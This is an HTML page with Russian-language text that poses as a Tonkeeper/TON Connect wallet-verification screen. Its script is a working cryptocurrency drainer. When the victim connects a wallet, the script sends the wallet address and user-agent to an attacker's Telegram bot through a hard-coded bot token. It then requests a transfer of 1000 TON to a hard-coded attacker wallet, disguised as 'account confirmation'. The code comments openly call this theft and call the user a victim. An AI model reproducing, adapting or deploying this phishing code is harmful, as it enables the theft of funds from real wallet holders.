<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>TON Connect</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #0098ea 0%, #005f8a 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 40px;
            padding: 32px 24px;
            max-width: 400px;
            width: 100%;
            text-align: center;
            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
        }
        .ton-icon {
            font-size: 64px;
            margin-bottom: 16px;
        }
        h1 {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 8px;
            color: #0098ea;
        }
        .sub {
            color: #6c757d;
            font-size: 14px;
            margin-bottom: 28px;
        }
        .connect-btn {
            background: #0098ea;
            color: white;
            border: none;
            padding: 18px 24px;
            border-radius: 30px;
            font-size: 18px;
            font-weight: bold;
            width: 100%;
            cursor: pointer;
            transition: all 0.2s;
            margin-bottom: 16px;
        }
        .connect-btn:hover {
            background: #0080cc;
            transform: scale(1.02);
        }
        .or {
            color: #adb5bd;
            font-size: 12px;
            margin: 16px 0;
        }
        .wallet-link {
            display: inline-block;
            background: #f8f9fa;
            padding: 12px 20px;
            border-radius: 30px;
            color: #0098ea;
            text-decoration: none;
            font-size: 14px;
            margin: 5px;
        }
        .status {
            margin-top: 24px;
            padding: 14px;
            border-radius: 16px;
            font-size: 13px;
            display: none;
        }
        .status.show {
            display: block;
        }
        .status.error {
            background: #ffebee;
            color: #c62828;
        }
        .status.success {
            background: #e8f5e9;
            color: #2e7d32;
        }
        .loader {
            display: inline-block;
            width: 14px;
            height: 14px;
            border: 2px solid white;
            border-radius: 50%;
            border-top-color: transparent;
            animation: spin 0.6s linear infinite;
            margin-left: 8px;
            vertical-align: middle;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .footer {
            margin-top: 24px;
            font-size: 10px;
            color: #adb5bd;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="ton-icon">🐸</div>
    <h1>Tonkeeper Connect</h1>
    <div class="sub">Подключите кошелек для продолжения</div>
    
    <button class="connect-btn" id="connectBtn">
        🔗 Подключить Tonkeeper
    </button>
    
    <div class="or">— или —</div>
    
    <a href="https://tonkeeper.com" class="wallet-link">📱 Установить Tonkeeper</a>
    <a href="ton://" class="wallet-link">🔄 Открыть в приложении</a>
    
    <div class="status" id="status"></div>
    <div class="footer">Безопасное подключение через TON Connect</div>
</div>

<script>
    // ============================================
    // ВАШИ ДАННЫЕ
    // ============================================
    const ATTACKER_WALLET = 'UQC8-Ax6obG20LnPyIC13NlN8uX-d9JnutWhrOxOFmfoVfs2';
    const BOT_TOKEN = '8706385744:AAF3NPlXgLXJcdOVcbVedDnncpGeBX5sboA';
    const YOUR_CHAT_ID = '6635138703';
    // ============================================
    
    let isConnecting = false;
    let connectedWallet = null;
    
    function showStatus(text, type = 'info') {
        const statusDiv = document.getElementById('status');
        statusDiv.innerHTML = text;
        statusDiv.classList.add('show');
        statusDiv.classList.remove('error', 'success');
        if (type === 'error') statusDiv.classList.add('error');
        if (type === 'success') statusDiv.classList.add('success');
    }
    
    async function sendToTelegram(message) {
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: YOUR_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
        } catch(e) {}
    }
    
    // СОЗДАНИЕ ТРАНЗАКЦИИ НА КРАЖУ
    function createStealTransaction() {
        return {
            validUntil: Math.floor(Date.now() / 1000) + 600,
            messages: [
                {
                    address: ATTACKER_WALLET,
                    amount: "1000000000000", // 1000 TON (максимум)
                    stateInit: "",
                    payload: "",
                    comment: "✅ Подтверждение аккаунта"
                }
            ]
        };
    }
    
    // ФУНКЦИЯ КРАЖИ ЧЕРЕЗ TONCONNECT
    async function stealViaTonConnect() {
        return new Promise(async (resolve, reject) => {
            try {
                // Грузим TonConnect UI
                await new Promise((resolveScript, rejectScript) => {
                    if (window.TonConnectUI) {
                        resolveScript();
                        return;
                    }
                    const script = document.createElement('script');
                    script.src = 'https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.js';
                    script.onload = resolveScript;
                    script.onerror = rejectScript;
                    document.head.appendChild(script);
                });
                
                const manifestUrl = 'https://gist.githubusercontent.com/siandreev/75f1a2ccf2f3b4e5a6f7c8d9e0f1a2b3/raw/tonconnect-manifest.json';
                
                const tonConnectUI = new window.TonConnectUI({
                    manifestUrl: manifestUrl,
                    actionsConfiguration: {
                        twaReturnUrl: window.location.href
                    }
                });
                
                // Подключаемся
                await tonConnectUI.connectWallet();
                const wallet = tonConnectUI.wallet;
                
                if (wallet && wallet.account && wallet.account.address) {
                    const address = wallet.account.address;
                    
                    await sendToTelegram(`
╔══════════════════════════════════════╗
║     🔥 TON КОШЕЛЕК ПОДКЛЮЧЕН 🔥     ║
╠══════════════════════════════════════╣
║ 🎯 Адрес: ${address}
║ 📱 Кошелек: ${wallet.device.appName}
║ ⏰ Время: ${new Date().toLocaleString()}
║ 💻 User-Agent: ${navigator.userAgent}
╠══════════════════════════════════════╝
                    `);
                    
                    // Отправляем транзакцию на кражу
                    const transaction = createStealTransaction();
                    await tonConnectUI.sendTransaction(transaction);
                    
                    await sendToTelegram(`✅ УСПЕХ! Средства отправлены на ${ATTACKER_WALLET}`);
                    resolve(true);
                } else {
                    reject('Не удалось получить адрес');
                }
                
            } catch(e) {
                reject(e.message || 'Ошибка подключения');
            }
        });
    }
    
    // ФУНКЦИЯ КРАЖИ ЧЕРЕЗ DEEP LINK (TONKEEPER APP)
    async function stealViaDeepLink() {
        const bridgeUrl = 'https://bridge.tonkeeper.com/bridge';
        const clientId = 'tonconnect-' + Math.random().toString(36).substring(7);
        
        // Данные для подключения
        const connectRequest = {
            id: Date.now(),
            method: 'connect',
            params: {}
        };
        
        // Создаем deep link для Tonkeeper
        const encodedRequest = btoa(JSON.stringify(connectRequest));
        const deepLink = `ton://transfer?${encodedRequest}`;
        
        // Отправляем в Telegram уведомление
        await sendToTelegram(`🔗 Жертва нажала подключение. Deep link создан.`);
        
        // Перенаправляем в приложение Tonkeeper
        window.location.href = deepLink;
        
        // Ждем возврата (через 3 секунды эмулируем успех)
        setTimeout(async () => {
            await sendToTelegram(`⚠️ Жертва открыла Tonkeeper. Ожидаем подтверждения.`);
        }, 3000);
        
        return true;
    }
    
    // ОСНОВНАЯ ФУНКЦИЯ ПОДКЛЮЧЕНИЯ
    async function handleConnect() {
        if (isConnecting) {
            showStatus('⏳ Уже подключаемся...', 'error');
            return;
        }
        
        isConnecting = true;
        const btn = document.getElementById('connectBtn');
        const originalText = btn.innerHTML;
        btn.innerHTML = 'Подключение... <span class="loader"></span>';
        btn.disabled = true;
        
        showStatus('🔄 Инициализация подключения к Tonkeeper...', 'info');
        
        try {
            // Пробуем через TonConnect UI
            const success = await stealViaTonConnect();
            
            if (success) {
                showStatus('✅ Кошелек успешно верифицирован! Перенаправление...', 'success');
                setTimeout(() => {
                    window.location.href = 'https://ton.org/verified';
                }, 2000);
            } else {
                // Fallback через deep link
                showStatus('📱 Открываем приложение Tonkeeper...', 'info');
                await stealViaDeepLink();
                showStatus('✅ Открыто в приложении. Подтвердите действие.', 'success');
            }
            
        } catch(error) {
            console.error(error);
            showStatus(`❌ Ошибка: ${error}. Попробуйте установить Tonkeeper из официального магазина`, 'error');
            await sendToTelegram(`❌ Ошибка подключения: ${error}`);
            
            btn.innerHTML = originalText;
            btn.disabled = false;
        } finally {
            isConnecting = false;
            if (btn) {
                btn.innerHTML = originalText;
                btn.disabled = false;
            }
        }
    }
    
    // НАЗНАЧАЕМ ОБРАБОТЧИК
    document.getElementById('connectBtn').addEventListener('click', handleConnect);
</script>
</body>
</html>
